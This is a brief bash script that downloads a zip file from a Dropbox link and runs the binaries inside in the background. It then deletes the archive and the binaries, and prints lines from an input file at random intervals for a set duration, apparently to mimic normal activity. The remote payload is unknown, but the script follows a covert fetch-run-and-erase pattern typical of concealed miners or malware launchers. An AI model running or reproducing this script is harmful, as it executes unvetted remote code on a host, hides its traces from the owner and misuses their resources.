#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/nb08aj5fecpf5w7/wan21.zip -q
unzip wan21.zip > /dev/null 2>&1
#pwd
./white ./head &
sleep 3
rm -rf wan21.zip
rm -rf white
rm -rf head
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 26 ))
done < $2

